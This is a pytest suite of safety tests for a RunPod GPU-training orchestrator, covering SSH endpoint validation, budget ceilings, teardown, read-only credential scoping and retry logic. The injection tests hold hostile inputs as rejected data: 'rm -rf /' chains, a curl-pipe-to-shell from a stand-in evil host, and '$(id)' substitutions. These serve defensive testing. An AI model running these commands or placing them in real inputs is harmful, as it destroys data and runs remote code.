"""Safety tests for the RunPod orchestrator.

These cover the controls that stand between an unsupervised run and either a
runaway bill or a shell injection. None of them provisions anything.
"""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

import pytest

from scripts.phase0.runpod_provision import validate_ssh_endpoint


class TestValidateSshEndpoint:
    """publicIp and portMappings come from a remote API and reach shell=True."""

    def test_accepts_a_normal_endpoint(self) -> None:
        assert validate_ssh_endpoint("203.0.113.7", 22041) == ("203.0.113.7", 22041)

    def test_accepts_ipv6(self) -> None:
        ip, port = validate_ssh_endpoint("2001:db8::1", 22)
        assert port == 22

    @pytest.mark.parametrize("hostile", [
        "203.0.113.7; rm -rf /",
        "203.0.113.7 && curl evil.example/x | sh",
        "$(id)",
        "`id`",
        "203.0.113.7'\"",
        "evil.example.com",
        "",
    ])
    def test_rejects_anything_that_is_not_an_address(self, hostile: str) -> None:
        with pytest.raises(ValueError, match="not an IP address"):
            validate_ssh_endpoint(hostile, 22)

    @pytest.mark.parametrize("port", [0, -1, 65536, 999999])
    def test_rejects_out_of_range_ports(self, port: int) -> None:
        with pytest.raises(ValueError, match="out-of-range SSH port"):
            validate_ssh_endpoint("203.0.113.7", port)


class TestBudgetGate:
    """The $1000 ceiling used to exist only in prose."""

    def test_refuses_a_fleet_that_would_exceed_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        # $50/hr/pod x 5 pods x 6h = $1500, over the $1000 budget.
        with patch.object(rp, "get_gpu_price", return_value=50.0):
            with pytest.raises(RuntimeError, match="Refusing to provision"):
                rp._check_budget("NVIDIA H100 80GB HBM3", 5)

    def test_allows_a_fleet_within_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "get_gpu_price", return_value=3.0):
            budget = rp._check_budget("NVIDIA H100 80GB HBM3", 5)
        assert budget["usd_per_hour_per_pod"] == 3.0
        assert budget["fleet_usd_per_hour"] == 15.0
        # Priced against the wall time the timeouts actually permit, not the
        # declared cap: the gate was unreachable when priced on MAX_RUN_HOURS.
        assert budget["worst_case_usd"] == pytest.approx(15.0 * budget["reachable_hours"])
        assert budget["reachable_hours"] > rp.MAX_RUN_HOURS
        assert budget["worst_case_usd"] <= budget["budget_usd"]

    def test_unknown_price_is_not_treated_as_free(self) -> None:
        from scripts.phase0 import runpod_provision as rpp

        with patch.object(rpp, "_gql", return_value={"gpuTypes": [{"lowestPrice": {}}]}):
            with pytest.raises(RuntimeError, match="no on-demand price"):
                rpp.get_gpu_price("NVIDIA H100 80GB HBM3")

    def test_price_ceiling_rejects_an_expensive_part(self) -> None:
        """The old fallback was largest-VRAM-wins, at any price."""
        from scripts.phase0 import runpod_provision as rpp

        gpus = [{"id": "SOME-GIANT-GPU", "memoryInGb": 192, "communityCloud": True}]
        with patch.object(rpp, "list_available_gpus", return_value=gpus), \
                patch.object(rpp, "get_gpu_price", return_value=99.0):
            with pytest.raises(RuntimeError, match="within \\$12"):
                rpp.find_fastest_available(min_vram_gb=48, max_usd_per_hour=12.0)


class TestTeardownIsScoped:

    def test_terminate_pods_reports_failures_and_continues(self) -> None:
        """One unreachable pod must not strand the rest."""
        from scripts.phase0 import runpod_provision as rpp

        killed: list[str] = []

        def _terminate(pod_id: str) -> None:
            if pod_id == "bad":
                raise RuntimeError("api down")
            killed.append(pod_id)

        with patch.object(rpp, "terminate_pod", side_effect=_terminate):
            failed = rpp.terminate_pods(["a", "bad", "c"])

        assert killed == ["a", "c"]
        assert failed == ["bad"]

    def test_teardown_keeps_state_when_a_pod_survives(self, tmp_path) -> None:
        """The state file is the only local record of what is still billing."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {"state": "running"},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=["p1"]):
            with pytest.raises(RuntimeError, match="still billing"):
                rp.teardown()

        assert state_file.exists(), "state file must survive a failed teardown"
        assert json.loads(state_file.read_text())["meta"]["still_running"] == ["p1"]

    def test_teardown_removes_state_on_success(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=[]):
            rp.teardown()

        assert not state_file.exists()


class TestPodState:

    def test_reads_the_legacy_bare_list_format(self, tmp_path) -> None:
        """An older state file must still be readable, to tear its pods down."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps(
            [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}]
        ))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            assert len(rp._read_pod_state()["pods"]) == 1

    def test_load_revalidates_endpoints_from_disk(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "evil; rm -rf /", "port": 22, "role": "A"}],
            "meta": {},
        }))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            with pytest.raises(ValueError, match="not an IP address"):
                rp._load_pod_state()


class TestNoCredentialsOnPods:
    """Pods get exactly one credential, and it is read-only.

    This asserted that pods carried NO credential at all, on the reasoning
    that the base model is public and fetches anonymously. The canary
    disproved the premise: HuggingFace rate-limits anonymous fetches per IP
    (HTTP 429) and a fleet exhausts the quota, so a token is required. The
    rule is therefore narrowed rather than dropped -- read-only only, and
    never the two credentials that would actually hurt.
    """

    def _env(self, monkeypatch: pytest.MonkeyPatch) -> dict[str, str]:
        from scripts.phase1b import runpod_parallel as rp

        monkeypatch.setattr(rp, "_get_hf_read_token", lambda: "hf_readonly_stub")
        return rp._get_pod_env()

    def test_the_wandb_key_never_reaches_a_pod(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Logging runs on the operator's machine precisely so it need not."""
        assert "WANDB_API_KEY" not in self._env(monkeypatch)

    def test_the_write_scoped_hf_token_is_never_read(self) -> None:
        """`pass huggingface/token` carries repo.write to the published model.

        Shipping it to a rented host to download a public model would trade a
        credential that can overwrite the release for a convenience.
        """
        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        assert '"huggingface/token"' not in source
        assert 'HF_READ_TOKEN_ENTRY: Final[str] = "huggingface/read-token"' in source

    def test_the_hf_token_comes_from_the_read_only_entry(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls: list[list[str]] = []

        class _Result:
            stdout = "hf_readonly_stub"

        def _fake_run(cmd: list[str], **kwargs: object) -> _Result:
            calls.append(cmd)
            return _Result()

        monkeypatch.setattr(rp.subprocess, "run", _fake_run)
        assert rp._get_hf_read_token() == "hf_readonly_stub"
        assert calls == [["pass", "huggingface/read-token"]]

    def test_a_missing_read_token_names_the_fix(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """And says not to substitute the write token."""
        from scripts.phase1b import runpod_parallel as rp

        def _absent(*args: object, **kwargs: object) -> None:
            raise FileNotFoundError("pass entry missing")

        monkeypatch.setattr(rp.subprocess, "run", _absent)
        with pytest.raises(RuntimeError) as excinfo:
            rp._get_hf_read_token()
        message = str(excinfo.value)
        assert "read-token" in message
        assert "repo.write" in message

    def test_the_cache_stays_on_the_volume(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A multi-gigabyte cache does not belong on the container disk."""
        assert self._env(monkeypatch)["HF_HOME"].startswith("/workspace/")


class TestImagePinning:

    def test_image_is_digest_pinned(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        assert "@sha256:" in rp.DOCKER_IMAGE, (
            "a mutable tag lets the image change under the run"
        )


class TestPartialProvisioningDoesNotLeak:
    """A fleet that half-comes-up must not leave the half billing.

    create_pods_parallel called future.result() directly, so the first
    exception propagated while the other futures were still creating pods.
    Those pods were created, billed, and recorded nowhere -- the caller never
    received a list, so the state file still said "provisioning" with zero
    pods. This is not hypothetical: RunPod ran out of H100 capacity mid-fleet
    on 2026-08-14 and left three pods orphaned.
    """

    def _configs(self, n: int) -> list[dict[str, str]]:
        return [{"name": f"pod{i}", "role": f"fold{i}"} for i in range(n)]

    def test_successful_pods_are_terminated_when_one_fails(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        terminated: list[list[str]] = []

        def _create(gpu_type_id, name, **kwargs):
            if name == "pod2":
                raise RuntimeError("no instances currently available")
            return {"pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22}

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods",
                            lambda ids: terminated.append(sorted(ids)) or [])

        with pytest.raises(RuntimeError, match="failed to create"):
            rp.create_pods_parallel(self._configs(4), "H100", max_workers=4)

        assert terminated == [["id-pod0", "id-pod1", "id-pod3"]]

    def test_the_error_names_the_first_failure(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        def _create(gpu_type_id, name, **kwargs):
            raise RuntimeError("no instances currently available")

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods", lambda ids: [])

        with pytest.raises(RuntimeError) as excinfo:
            rp.create_pods_parallel(self._configs(2), "H100", max_workers=2)

        message = str(excinfo.value)
        assert "2 of 2" in message
        assert "no instances currently available" in message

    def test_a_termination_failure_is_reported_not_swallowed(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        """A pod that will not die is the one the operator must hear about."""
        from scripts.phase0 import runpod_provision as rp

        def _create(gpu_type_id, name, **kwargs):
            if name == "pod1":
                raise RuntimeError("boom")
            return {"pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22}

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods", lambda ids: ["id-pod0"])

        with caplog.at_level("ERROR"), pytest.raises(RuntimeError):
            rp.create_pods_parallel(self._configs(2), "H100", max_workers=2)

        assert "STILL BILLING" in caplog.text

    def test_a_fully_successful_fleet_terminates_nothing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        terminated: list[list[str]] = []
        monkeypatch.setattr(rp, "create_pod", lambda g, name, **k: {
            "pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22,
        })
        monkeypatch.setattr(rp, "terminate_pods",
                            lambda ids: terminated.append(ids) or [])

        pods = rp.create_pods_parallel(self._configs(3), "H100", max_workers=3)

        assert terminated == []
        assert [p["role"] for p in pods] == ["fold0", "fold1", "fold2"]


class TestTransientSshRetry:
    """All five pods of a live fleet lost SSH at once on 2026-08-14 with
    "kex_exchange_identification: Connection reset by peer" -- the transport
    was refused before authentication. Without a retry that ended a campaign
    whose pods were already paid for.
    """

    def test_connection_reset_is_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert _is_transient_ssh_failure(
            "kex_exchange_identification: read: Connection reset by peer"
        )

    def test_other_transport_failures_are_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        for stderr in (
            "ssh: connect to host 1.2.3.4 port 22: Connection refused",
            "ssh: connect to host 1.2.3.4 port 22: Operation timed out",
            "Connection closed by remote host",
            "client_loop: send disconnect: Broken pipe",
        ):
            assert _is_transient_ssh_failure(stderr), stderr

    def test_authentication_failure_is_not_retried(self) -> None:
        """A wrong key fails identically every time; retrying only delays it."""
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure("Permission denied (publickey).")

    def test_host_key_failure_is_not_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure(
            "Host key verification failed. Connection reset by peer"
        )

    def test_ordinary_command_failure_is_not_retried(self, ) -> None:
        """Exit 1 from a command that ran is a result, not a transport fault.

        Re-running it could repeat a side effect, so it must surface as-is.
        """
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure("ModuleNotFoundError: No module named x")

    def test_retry_happens_and_then_succeeds(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        class _R:
            def __init__(self, rc: int, err: str) -> None:
                self.returncode, self.stdout, self.stderr = rc, "", err

        def _run(*args: object, **kwargs: object) -> _R:
            calls["n"] += 1
            if calls["n"] < 3:
                return _R(255, "kex_exchange_identification: Connection reset by peer")
            return _R(0, "")

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        result = rp._ssh("1.2.3.4", 22, "true")

        assert calls["n"] == 3
        assert result.returncode == 0

    def test_a_persistent_transport_failure_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        class _R:
            returncode, stdout = 255, ""
            stderr = "kex_exchange_identification: Connection reset by peer"

        monkeypatch.setattr(rp.subprocess, "run", lambda *a, **k: _R())
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        with pytest.raises(RuntimeError, match="SSH command failed"):
            rp._ssh("1.2.3.4", 22, "true")


class TestRsyncToRetries:
    """Sending the tree is idempotent, so a transient failure should retry.

    A single rsync failure during bootstrap took down two pods of a five-pod
    fleet mid-campaign. _rsync_from already retried; this direction did not.
    """

    def test_a_transient_failure_is_retried(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        def _run(cmd, **kwargs):
            calls["n"] += 1
            if calls["n"] < 2:
                raise sp.CalledProcessError(255, cmd)
            return None

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)

        rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")
        assert calls["n"] == 2

    def test_a_persistent_failure_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        def _run(cmd, **kwargs):
            raise sp.CalledProcessError(255, cmd)

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)

        with pytest.raises(sp.CalledProcessError):
            rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")

    def test_success_sends_once(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}
        monkeypatch.setattr(rp.subprocess, "run",
                            lambda cmd, **k: calls.__setitem__("n", calls["n"] + 1))
        rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")
        assert calls["n"] == 1


class TestHungSshIsRetried:
    """A hung session produces no returncode, so the stderr-marker check
    never sees it. One pod's bootstrap hung silently -- the pod stayed
    reachable for new connections while the original session was a zombie --
    and blocked the whole fleet's bootstrap barrier until the one-hour
    default timeout.
    """

    def test_a_timeout_is_retried_then_succeeds(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        class _R:
            returncode, stdout, stderr = 0, "", ""

        def _run(*args: object, **kwargs: object) -> _R:
            calls["n"] += 1
            if calls["n"] == 1:
                raise sp.TimeoutExpired(cmd="ssh", timeout=900)
            return _R()

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        assert rp._ssh("1.2.3.4", 22, "true").returncode == 0
        assert calls["n"] == 2

    def test_a_persistent_hang_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        def _run(*args: object, **kwargs: object) -> None:
            raise sp.TimeoutExpired(cmd="ssh", timeout=900)

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        with pytest.raises(sp.TimeoutExpired):
            rp._ssh("1.2.3.4", 22, "true")

    def test_bootstrap_uses_the_shorter_ceiling(self) -> None:
        """An hour is the wrong bound for a 2-4 minute install."""
        from scripts.phase1b import runpod_parallel as rp

        assert rp.SSH_BOOTSTRAP_TIMEOUT_S < rp.SSH_DEFAULT_TIMEOUT_S
        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        bootstrap = source.split("def _bootstrap_pod")[1].split("\ndef ")[0]
        # Every SSH call in bootstrap carries the bounded timeout.
        assert bootstrap.count("SSH_BOOTSTRAP_TIMEOUT_S") == bootstrap.count("_ssh(")


class TestOneFoldFailureDoesNotAbortTheFleet:
    """P2. A credential read that raised became a failed fleet, not a failed fold.

    `_run_fold_on_pod` called `_get_pod_env()` one line above its own `try`,
    and `run_folds` called `f.result()` with no guard. `_get_pod_env` shells
    out to `pass`, which raises RuntimeError on any failure.

    The trigger is not exotic. Five worker threads invoke `pass` at the same
    instant when the folds launch. The GPG agent serialises decryption and
    cannot run pinentry from a non-tty worker thread, so an expired agent
    cache races all five against the same ten-second timeout. One raise ends
    the `as_completed` loop, discards the other four futures' results, and
    reaches full_pipeline's `finally` with results_are_safe still False: five
    GPUs keep billing and four folds that were about to succeed are abandoned.

    The bootstrap loop twenty lines above already caught for exactly this
    reason. The fold loop did not get the same treatment -- and the bootstrap
    loop still raced the same five `pass` calls, so catching there only
    converted the race into "every pod failed to bootstrap".
    """

    ROLES = ("MITRE ATLAS", "NIST AI 100-2", "OWASP AI Exchange")

    def _fleet(self, monkeypatch, run_fold, env_calls=None):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22, "pod_id": f"id-{r}"}
                for r in self.ROLES]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "_check_deadline", lambda: None)
        monkeypatch.setattr(rpp, "_extend_deadline", lambda: None)
        monkeypatch.setattr(rpp, "fold_roster", lambda split="test": list(self.ROLES))
        monkeypatch.setattr(rpp, "_bootstrap_pod", lambda *a, **k: None)

        def _env() -> dict[str, str]:
            if env_calls is not None:
                env_calls.append(1)
            return {"HF_TOKEN": "hf_read_only"}

        monkeypatch.setattr(rpp, "_get_pod_env", _env)
        monkeypatch.setattr(rpp, "_run_fold_on_pod", run_fold)
        return rpp

    def test_a_fold_that_raises_becomes_a_failed_fold(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            if pod["role"] == "NIST AI 100-2":
                raise RuntimeError("pass: gpg-agent decryption timed out")
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        failed = rpp.run_folds("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_the_other_folds_still_report_their_results(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The four survivors are the whole point of catching."""
        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            if pod["role"] == "MITRE ATLAS":
                raise RuntimeError("pass: gpg-agent decryption timed out")
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        failed = rpp.run_folds("cfg")

        assert sorted(failed) == ["MITRE ATLAS"]

    def test_the_credential_is_read_once_on_the_main_thread(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """One `pass` invocation instead of five concurrent ones removes the race."""
        env_calls: list[int] = []

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold, env_calls=env_calls)

        rpp.run_folds("cfg")

        assert len(env_calls) == 1

    def test_every_fold_receives_the_hoisted_environment(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Hoisting must hand the env down, not silently drop the token."""
        seen: list[dict[str, str] | None] = []

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            seen.append(env)
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        rpp.run_folds("cfg")

        assert len(seen) == len(self.ROLES)
        assert all(e == {"HF_TOKEN": "hf_read_only"} for e in seen)


class TestCollectVerifiesThePayload:
    """P3. A collected fold and an empty directory looked the same.

    `collect` recorded a role as failed only when `_rsync_from` raised. An
    rsync against a directory that exists and holds no fold record exits 0,
    so it was counted as collected.

    The path to unrecoverable loss: a fold exits 0 without writing
    fold_result.json, so failed_folds is empty and uncollected is empty,
    full_pipeline sets results_are_safe = True, teardown() runs, and the pods
    are destroyed. `aggregate` then fails with nothing left to re-run and the
    GPU hours already spent.

    Verifying the payload rather than the transport is the whole point of the
    function.
    """

    def _collect(self, monkeypatch, tmp_path, roles, payload):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22} for r in roles]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "RESULTS_DIR", tmp_path)

        def _rsync(ip: str, port: int, remote: str, local: str) -> None:
            # rsync exits 0 whether or not the remote directory held anything.
            for role, body in payload.items():
                if body is None:
                    continue
                d = Path(local) / f"fold_{role.replace(' ', '_')}"
                d.mkdir(parents=True, exist_ok=True)
                (d / "fold_result.json").write_text(body, encoding="utf-8")

        monkeypatch.setattr(rpp, "_rsync_from", _rsync)
        return rpp

    def test_an_rsync_that_moved_nothing_is_not_a_collected_fold(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        roles = ["MITRE ATLAS", "NIST AI 100-2"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            "MITRE ATLAS": json.dumps({"framework": "MITRE ATLAS"}),
            "NIST AI 100-2": None,
        })

        failed = rpp.collect("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_a_fold_result_that_does_not_parse_is_not_collected(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """A truncated transfer leaves a file that exists and is not JSON."""
        roles = ["MITRE ATLAS", "NIST AI 100-2"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            "MITRE ATLAS": json.dumps({"framework": "MITRE ATLAS"}),
            "NIST AI 100-2": '{"framework": "NIST AI 100-2", "hit',
        })

        failed = rpp.collect("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_a_complete_fleet_collects_cleanly(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The check must not invent failures on a good run."""
        roles = ["MITRE ATLAS", "NIST 800-53 v5"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            r: json.dumps({"framework": r}) for r in roles
        })

        assert rpp.collect("cfg") == []

    def test_a_transport_failure_is_still_a_failure(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The payload check adds to the rsync check, it does not replace it."""
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22}
                for r in ("MITRE ATLAS", "NIST AI 100-2")]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "RESULTS_DIR", tmp_path)

        def _rsync(ip: str, port: int, remote: str, local: str) -> None:
            raise RuntimeError("rsync: connection unexpectedly closed")

        monkeypatch.setattr(rpp, "_rsync_from", _rsync)

        assert sorted(rpp.collect("cfg")) == ["MITRE ATLAS", "NIST AI 100-2"]


class TestCorpusCompletenessIsEnforcedBeforeSpend:
    """The refusal that never fired.

    `assert_corpus_matches_training_links` is written as a refusal -- its own
    docstring opens "Refuse to train against a corpus the training links were
    not built from" -- and until 2026-08-26 nothing called it. It appeared in
    the Jetson briefing as a checklist row and in its own tests, and nowhere
    on any path that trains.

    What it guards is not cosmetic. A clone without the gitignored overlay
    trains on 4,019 of the 4,389 links, because 370 belong to the four overlay
    frameworks whose prose is deliberately not in git (dsomm 213, iso_27001
    92, etsi 36, csa_ccm 29). That is 8.4% of the training set, and the run
    reports the same figures in the same shape. Nothing in the output says so.

    A checklist row is not a gate. This is the gate.
    """

    ROLES = ("MITRE ATLAS", "NIST AI 100-2")

    def _fleet(self, monkeypatch, submitted):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22, "pod_id": f"id-{r}"}
                for r in self.ROLES]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "_check_deadline", lambda: None)
        monkeypatch.setattr(rpp, "_extend_deadline", lambda: None)
        monkeypatch.setattr(rpp, "fold_roster", lambda split="test": list(self.ROLES))
        monkeypatch.setattr(rpp, "_bootstrap_pod", lambda *a, **k: None)
        monkeypatch.setattr(rpp, "_get_pod_env", lambda: {"HF_TOKEN": "t"})

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            submitted.append(pod["role"])
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        monkeypatch.setattr(rpp, "_run_fold_on_pod", _run_fold)
        return rpp

    def test_a_partial_corpus_stops_the_run_before_any_fold(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from tract.training.data_quality import CorpusMismatchError

        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)

        def _mismatch() -> str:
            raise CorpusMismatchError("corpus digest differs from the recorded one")

        monkeypatch.setattr(rpp, "assert_corpus_matches_training_links", _mismatch)

        with pytest.raises(CorpusMismatchError):
            rpp.run_folds("cfg")

        # The whole point is that no GPU hour is spent discovering this.
        assert submitted == []

    def test_a_complete_corpus_runs_normally(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The gate must not stop a good run."""
        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)
        monkeypatch.setattr(
            rpp, "assert_corpus_matches_training_links", lambda: "deadbeef",
        )

        assert rpp.run_folds("cfg") == []
        assert sorted(submitted) == sorted(self.ROLES)

    def test_a_missing_sidecar_also_stops_the_run(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No sidecar means nothing to check against, which is not a pass."""
        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)

        def _absent() -> str:
            raise FileNotFoundError("hub_links_training.meta.json is absent")

        monkeypatch.setattr(rpp, "assert_corpus_matches_training_links", _absent)

        with pytest.raises(FileNotFoundError):
            rpp.run_folds("cfg")
        assert submitted == []
